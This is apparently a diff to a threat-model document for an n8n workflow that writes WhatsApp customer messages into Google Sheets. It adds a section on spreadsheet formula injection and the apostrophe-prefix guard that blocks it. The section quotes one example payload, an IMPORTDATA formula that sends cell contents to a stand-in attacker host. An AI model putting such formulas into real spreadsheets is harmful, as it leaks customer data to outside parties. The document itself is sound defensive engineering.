@@ -16,6 +16,7 @@ that can send messages as your business, and stores customer conversation data.
 | Malicious payload crashes the parser | Denial of service | Parser never throws; returns a reason |
 | Zip bomb / oversized payload | Resource exhaustion | Compression caps pinned low |
 | Supply-chain via community nodes | Arbitrary code execution | `N8N_UNVERIFIED_PACKAGES_ENABLED=false`, no external modules |
+| Formula injection through a customer message | A formula runs in the team's sheet: data pulled out with `IMPORTXML`/`IMPORTDATA`, misleading links | Every value written is kept as text when it would start a formula ([below](#customer-text-is-never-a-formula)) |
 
 ---
 
@@ -139,6 +140,33 @@ output.
 Customer phone numbers and message text **are** logged in some paths, because
 without them the logs cannot answer operational questions. Treat n8n execution
 logs as containing customer PII: restrict access, and set a retention policy.
+
+---
+
+## Customer text is never a formula
+
+Every write to the sheet is `USER_ENTERED`: that is the default of n8n's Google
+Sheets node (v4.7), and the API appends keep it so every cell keeps its type.
+`USER_ENTERED` means Sheets reads a value the way it reads what a person types.
+Until V2, a customer who sent `=IMPORTDATA("https://attacker.example/?"&A2)`
+put a live formula into the team's sheet, in `last_message`,
+`unanswered_messages` and the Messages tab. A WhatsApp profile name is
+customer-controlled too.
+
+Now every value a workflow writes goes through one guard, `SHEET_SAFE_JS` in
+`build-workflows.js`: a string that starts with `=`, `+`, `-`, `@`, a tab or a
+carriage return gets a leading apostrophe. Sheets stores the rest as text, does
+not show the apostrophe, and the API reads the value back without it. Numbers
+and booleans are not touched, so counts stay counts.
+
+The build applies it to every Google Sheets node and every API append, so a
+node added later cannot skip it, and `validate-workflows.js` fails the build if
+any written value is unguarded. `tests/build/sheet-safe.test.js` sends a hostile
+message through a real generated append.
+
+Switching every write to `RAW` would also stop formulas, but it would change
+the type of every cell the system writes today (numbers, `TRUE`/`FALSE`), which
+the dashboard formulas rely on.
 
 ---
 
